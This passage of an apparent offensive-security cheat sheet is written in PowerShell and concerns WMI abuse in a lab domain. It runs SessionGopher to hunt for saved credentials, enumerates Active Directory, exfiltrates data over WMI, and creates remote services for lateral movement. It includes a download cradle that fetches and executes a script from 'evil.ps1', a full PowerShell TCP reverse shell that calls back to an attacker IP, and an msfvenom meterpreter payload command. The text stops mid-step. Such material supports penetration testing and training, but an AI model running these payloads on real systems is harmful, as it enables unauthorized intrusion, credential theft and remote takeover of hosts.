</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>nishang</span><span class=p>\</span><span class=n>Gather</span><span class=p>\</span><span class=nb>Invoke-SessionGopher</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Gather information from the local box</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SessionGopher</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Gather information from a remote box</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SessionGopher</span> <span class=n>-Verbose</span> <span class=n>-ComputerName</span> <span class=s2>&#34;CYBERLAB\COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Gather information from all domain machines</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SessionGopher</span> <span class=n>-Verbose</span> <span class=n>-AllDomain</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Gather information from all domain machines excluding DC to avoid detection</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SessionGopher</span> <span class=n>-Verbose</span> <span class=n>-AllDomain</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span> <span class=n>-ExcludeDC</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Explore filesystem to look for Putty private key files (.ppk), RDP connection files (.rdp) and RSA files (.stdid)</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SessionGopher</span> <span class=n>-Thorough</span>
</span></span></code></pre></div><h3 id=active-directory-enumeration>Active Directory Enumeration</h3><p>The following commands must be ran from a domain-joined box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Classes prefixed with ads_ are abstract, while ds_ are dynamic</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-List</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get the current domain</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_domain</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>ds_dc</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_ComputerSystem</span><span class=p>).</span><span class=py>Domain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get domain trusts</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_trusteddomain</span> <span class=p>|</span> <span class=nb>select </span><span class=n>ds_cn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get domain password policy</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_domain</span> <span class=p>|</span> <span class=nb>select </span><span class=n>DS_lockoutDuration</span><span class=p>,</span><span class=n>DS_lockoutObservationWindow</span><span class=p>,</span><span class=n>DS_lockoutThreshold</span><span class=p>,</span><span class=n>DS_maxPwdAge</span><span class=p>,</span><span class=n>DS_minPwdAge</span><span class=p>,</span><span class=n>DS_minPwdLength</span><span class=p>,</span><span class=n>DS_pwdHistoryLength</span><span class=p>,</span><span class=n>DS_pwdProperties</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get the domain controller</span>
</span></span><span class=line><span class=cl><span class=c># 532480 is the User Account Control value for the domain controller</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>ds_userAccountControl</span> <span class=o>-eq</span> <span class=mf>532480</span><span class=p>}</span> <span class=p>|</span> <span class=nb>select </span><span class=n>ds_cn</span>
</span></span><span class=line><span class=cl><span class=c># Get all properties removing empty values</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>ds_userAccountControl</span> <span class=o>-eq</span> <span class=mf>532480</span><span class=p>}).</span><span class=py>Properties</span> <span class=p>|</span> <span class=nb>Foreach-Object</span> <span class=p>{</span><span class=k>if</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>value</span> <span class=o>-AND</span> <span class=nv>$_</span><span class=p>.</span><span class=py>name</span> <span class=o>-NOTMATCH</span> <span class=s2>&#34;__&#34;</span><span class=p>){</span><span class=vm>@</span><span class=p>{</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>name</span><span class=p>)</span> <span class=p>=</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>value</span><span class=p>)}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get all domain users</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl><span class=c># Get details of a particular user</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>name</span> <span class=o>-match</span> <span class=s2>&#34;STUDENT1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c># Get all user of a trusted domain</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span> <span class=n>-Filter</span> <span class=s2>&#34;Domain = &#39;CYBERSCHOOL&#39;&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get all domain and local groups</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Group</span>
</span></span><span class=line><span class=cl><span class=c># Get all domain groups</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_GroupInDomain</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{[</span><span class=no>wmi</span><span class=p>]</span><span class=nv>$_</span><span class=p>.</span><span class=n>PartComponent</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c># Get all groups of a trusted domain</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_GroupInDomain</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>GroupComponent</span> <span class=o>-match</span> <span class=s2>&#34;CYBERSCHOOL&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{[</span><span class=no>wmi</span><span class=p>]</span><span class=nv>$_</span><span class=p>.</span><span class=n>PartComponent</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get members of domain admin group for the current and trusted domains</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_GroupUser</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>GroupComponent</span> <span class=o>-match</span> <span class=s2>&#34;Domain Admins&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{[</span><span class=no>wmi</span><span class=p>]</span><span class=nv>$_</span><span class=p>.</span><span class=n>PartComponent</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c># Get members of domain admin group for a trusted domain</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_GroupUser</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>GroupComponent</span> <span class=o>-match</span> <span class=s2>&#34;Domain Admins&#34;</span> <span class=o>-and</span> <span class=nv>$_</span><span class=p>.</span><span class=py>GroupComponent</span> <span class=o>-match</span> <span class=s2>&#34;CYBERSCHOOL&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{[</span><span class=no>wmi</span><span class=p>]</span><span class=nv>$_</span><span class=p>.</span><span class=n>PartComponent</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get group membership for a particular user</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_GroupUser</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>PartComponent</span> <span class=o>-match</span> <span class=s2>&#34;STUDENT01&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{[</span><span class=no>wmi</span><span class=p>]</span><span class=nv>$_</span><span class=p>.</span><span class=n>GroupComponent</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get all domain computers</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> 
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>ds_cn</span>
</span></span><span class=line><span class=cl><span class=c># Get all non-empty properties for a computer</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>ds_cn</span> <span class=o>-eq</span> <span class=s2>&#34;COMPUTER01&#34;</span><span class=p>}).</span><span class=py>Properties</span> <span class=p>|</span> <span class=nb>Foreach-Object</span> <span class=p>{</span><span class=k>if</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>value</span> <span class=o>-AND</span> <span class=nv>$_</span><span class=p>.</span><span class=py>name</span> <span class=o>-NOTMATCH</span> <span class=s2>&#34;__&#34;</span><span class=p>){</span><span class=vm>@</span><span class=p>{</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>name</span><span class=p>)</span> <span class=p>=</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>value</span><span class=p>)}}}</span>
</span></span><span class=line><span class=cl><span class=c># List computers with a particular operating system</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>DS_operatingSystem</span> <span class=o>-match</span> <span class=s2>&#34;Windows 10&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>select </span><span class=n>ds_cn</span> 
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>DS_operatingSystem</span> <span class=o>-match</span> <span class=s2>&#34;Windows 10&#34;</span><span class=p>}).</span><span class=py>Properties</span> <span class=p>|</span> <span class=nb>Foreach-Object</span> <span class=p>{</span><span class=k>if</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>value</span> <span class=o>-AND</span> <span class=nv>$_</span><span class=p>.</span><span class=py>name</span> <span class=o>-NOTMATCH</span> <span class=s2>&#34;__&#34;</span><span class=p>){</span><span class=vm>@</span><span class=p>{</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>name</span><span class=p>)</span> <span class=p>=</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>value</span><span class=p>)}}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Check local admin access on remote computers</span>
</span></span><span class=line><span class=cl><span class=nv>$COMPUTERS</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>directory</span><span class=p>\</span><span class=n>ldap</span> <span class=n>-Class</span> <span class=n>ds_computer</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>ds_cn</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$computer</span> <span class=k>in</span> <span class=nv>$COMPUTERS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>Try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$data</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_ComputerSystem</span> <span class=n>-ComputerName</span> <span class=nv>$computer</span> <span class=n>-ErrorAction</span> <span class=n>Stop</span>
</span></span><span class=line><span class=cl>		<span class=nb>Write-Host</span> <span class=nv>$computer</span><span class=p>,</span><span class=s2>&#34;: &#34;</span> <span class=n>-NoNewline</span><span class=p>;</span> <span class=nb>Write-Host</span> <span class=s2>&#34;OK&#34;</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>Catch</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nb>Write-Host</span> <span class=nv>$computer</span><span class=p>,</span><span class=s2>&#34;: &#34;</span> <span class=n>-NoNewline</span><span class=p>;</span> <span class=nb>Write-Host</span> <span class=s2>&#34;NOK&#34;</span> <span class=n>-ForegroundColor</span> <span class=n>Red</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It is not possible to perform User Hunting through WMI.</p><h3 id=lateral-movement---wmi-as-storage-and-communication-channel>Lateral Movement - WMI as storage and communication channel</h3><p>Using WMI as a communication channel:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Send-InfoWMI.ps1</span>
</span></span><span class=line><span class=cl><span class=c># Send data/files from a compromised machine (needs local admin rights)</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Send-InfoWMI</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Send-InfoWMI</span> <span class=n>-FileToSend</span> <span class=s2>&#34;c:\data.txt&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;Administrator&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Send-InfoWMI</span> <span class=n>-DataToSend</span> <span class=p>(</span><span class=nb>Get-Process</span><span class=p>)</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;Administrator&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get-InfoWMI.ps1</span>
</span></span><span class=line><span class=cl><span class=c># Receive data/files on the local machine</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Get-InfoWMI</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-InfoWMI</span>
</span></span><span class=line><span class=cl><span class=nb>Get-InfoWMI</span> <span class=n>-OutputFile</span> <span class=s2>&#34;c:\data.txt&#34;</span>
</span></span></code></pre></div><h3 id=lateral-movement---command-execution---win32_service>Lateral Movement - Command Execution - Win32_Service</h3><p>It is possible to create a service on a remote machine using WMI to execute commands and scripts. This also allows persistence capabilities, but it is more noisy than simply starting a process.</p><p>Create a service</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$ServiceType</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte</span><span class=p>]</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl><span class=nv>$ErrorControl</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte</span><span class=p>]</span> <span class=mf>1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=vm>$False</span><span class=p>,</span><span class=s2>&#34;Windows Performance&#34;</span><span class=p>,</span><span class=nv>$ErrorControl</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=s2>&#34;WinPerf&#34;</span><span class=p>,</span><span class=s2>&#34;c:\Windows\System32\calc.exe&#34;</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=nv>$ServiceType</span><span class=p>,</span><span class=s2>&#34;Manual&#34;</span><span class=p>,</span><span class=s2>&#34;NT AUTHORITY\SYSTEM&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span>
</span></span></code></pre></div><table><thead><tr><th>Argument</th><th>Description</th></tr></thead><tbody><tr><td>$False</td><td>DesktopInteract</td></tr><tr><td>&ldquo;Windows Performance&rdquo;</td><td>DisplayName</td></tr><tr><td>$ErrorControl</td><td>User is notified</td></tr><tr><td>$null</td><td>LoadOrderGroup</td></tr><tr><td>$null</td><td>LoadOrderGroupDependencies</td></tr><tr><td>&ldquo;WinPerf&rdquo;</td><td>Name</td></tr><tr><td>&ldquo;c:\Windows\System32\calc.exe&rdquo;</td><td>PathName</td></tr><tr><td>$null</td><td>ServiceDependencies</td></tr><tr><td>$ServiceType</td><td>OwnProcess</td></tr><tr><td>&ldquo;Manual&rdquo;</td><td>StartMode</td></tr><tr><td>&ldquo;NT AUTHORITY\SYSTEM&rdquo;</td><td>StartName</td></tr><tr><td>""</td><td>StartPassword</td></tr></tbody></table><p>Check if the service has been correctly created:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span>
</span></span></code></pre></div><p>Start the service:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=p>|</span> <span class=nb>Invoke-WmiMethod</span> <span class=n>-Name</span> <span class=n>StartService</span>
</span></span></code></pre></div><p>Remove the service:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=p>|</span> <span class=nb>Remove-WmiObject</span>
</span></span></code></pre></div><p>Abuse service creation on a remote box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$ServiceType</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte</span><span class=p>]</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl><span class=nv>$ErrorControl</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte</span><span class=p>]</span> <span class=mf>1</span>
</span></span><span class=line><span class=cl><span class=c># Encoded command</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=vm>$False</span><span class=p>,</span><span class=s2>&#34;Windows Performance&#34;</span><span class=p>,</span><span class=nv>$ErrorControl</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=s2>&#34;WinPerf&#34;</span><span class=p>,</span><span class=s2>&#34;c:\Windows\System32\cmd.exe /c powershell -e &lt;Base64EncodedScript&gt;&#34;</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=nv>$ServiceType</span><span class=p>,</span><span class=s2>&#34;Manual&#34;</span><span class=p>,</span><span class=s2>&#34;NT AUTHORITY\SYSTEM&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENTI01&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=p>|</span> <span class=nb>Invoke-WmiMethod</span> <span class=n>-Name</span> <span class=n>StartService</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Download cradle</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=vm>$False</span><span class=p>,</span><span class=s2>&#34;Windows Performance&#34;</span><span class=p>,</span><span class=nv>$ErrorControl</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=s2>&#34;WinPerf&#34;</span><span class=p>,</span><span class=s2>&#34;c:\Windows\System32\cmd.exe /c powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://evil.ps1&#39;)&#34;</span><span class=p>,</span><span class=vm>$null</span><span class=p>,</span><span class=nv>$ServiceType</span><span class=p>,</span><span class=s2>&#34;Manual&#34;</span><span class=p>,</span><span class=s2>&#34;NT AUTHORITY\SYSTEM&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENTI01&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=p>|</span> <span class=nb>Invoke-WmiMethod</span> <span class=n>-Name</span> <span class=n>StartService</span>
</span></span></code></pre></div><p>Get a reverse shell using <a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service target=_blank rel=noopener>Win32_Service</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># On the local machine it is necessary to open a listener using powercat</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>powercat</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-v</span> <span class=n>-p</span> <span class=mf>8080</span> <span class=n>-t</span> <span class=mf>10000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Delete the remote service (if it exists)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Service</span> <span class=n>-Filter</span> <span class=s1>&#39;Name = &#34;WinPerf&#34;&#39;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;10.10.10.10&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\Administrator&#34;</span> <span class=p>|</span> <span class=nb>Invoke-WmiMethod</span> <span class=n>-Name</span> <span class=n>Delete</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=p>=</span> <span class=s2>&#34;10.10.10.2&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=p>=</span> <span class=mf>8080</span>
</span></span><span class=line><span class=cl><span class=nv>$Shell</span> <span class=p>=</span> <span class=s1>&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;&#39;</span> <span class=p>+</span> <span class=nv>$ip</span> <span class=p>+</span> <span class=s1>&#39;&#34;,&#39;</span> <span class=p>+</span> <span class=nv>$port</span> <span class=p>+</span> <span class=s1>&#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$EncodedShell</span> <span class=p>=[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToBase64String</span><span class=p>([</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>Unicode</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$Shell</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># You can also use msfvenom to generate the base64-encoded reverse shell</span>
</span></span><span class=line><span class=cl><span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span> <span class=n>LHOST</span><span class=p>=</span><span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>2</span> <span class=n>LPORT</span><span class=p>=</span><span class=mf>8080</span> <span class=err>â€“</span><span class=n>format</span> <span class=n>psh</span> <span class=err>â€“</span><span class=n>smallest</span> <span class=p>|</span> <span class=n>msfvenom</span> <span class=err>â€“</span><span class=n>payload</span> <span class=err>â€“</span> <span class=err>â€“</span><span class=n>platform</span> <span class=n>win</span> <span class=err>â€“</span><span class=n>arch</span> <span class=n>x86</span> <span class=err>â€“</span><span class=n>encoder</span> <span class=n>base64</span> <span class=n>NOEXIT</span> <span class=n>SYSWOW64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Start the service</span>
